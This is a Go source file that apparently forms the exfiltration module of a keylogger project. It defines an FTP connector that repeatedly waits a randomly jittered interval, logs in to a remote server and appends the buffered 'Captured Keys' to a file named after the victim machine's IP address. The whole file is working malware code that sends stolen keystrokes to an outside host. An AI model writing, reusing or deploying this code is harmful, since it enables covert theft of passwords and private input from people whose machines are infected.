package connector

import (
	"bytes"
	"fmt"
	"log"
	"math/rand"
	"time"

	"github.com/adelapazborrero/logger/pkg/tools"
	"github.com/jlaffaye/ftp"
)

type FTP struct {
	Host      string
	Username  string
	Password  string
	Timeout   time.Duration
	MaxJitter int
	Reconnect time.Duration
}

func NewFTP(host, username, password string, timeout time.Duration, maxJitter int, reconnect time.Duration) *FTP {
	return &FTP{
		Host:      host,
		Username:  username,
		Password:  password,
		Timeout:   timeout,
		MaxJitter: maxJitter,
		Reconnect: reconnect,
	}
}

func (f *FTP) addJitter() {
	jitter := rand.Intn(f.MaxJitter)
	time.Sleep(f.Reconnect + time.Duration(jitter)*time.Second)
}

func (f *FTP) connect() *ftp.ServerConn {
	c, err := ftp.Dial(f.Host, ftp.DialWithTimeout(f.Timeout))
	if err != nil {
		log.Fatal(err)
	}

	err = c.Login(f.Username, f.Password)
	if err != nil {
		log.Fatal(err)
	}

	return c
}

func (f *FTP) SendData(logBuffer *bytes.Buffer) {
	iterations := 1
	for {
		now := time.Now()
		f.addJitter()

		c := f.connect()

		data := bytes.NewBufferString(fmt.Sprintf("Captured Keys:\n%s\nIteration: %d", logBuffer.String(), iterations))

		err := c.Append(fmt.Sprintf("%s.txt", tools.GetLocalIP().String()), data)
		if err != nil {
			log.Println(err)
			c.Quit()
			return
		}

		log.Printf("Iteration: %d, Time: %s\n", iterations, time.Since(now))
		iterations++
		logBuffer.Reset()
		c.Quit()
	}
}
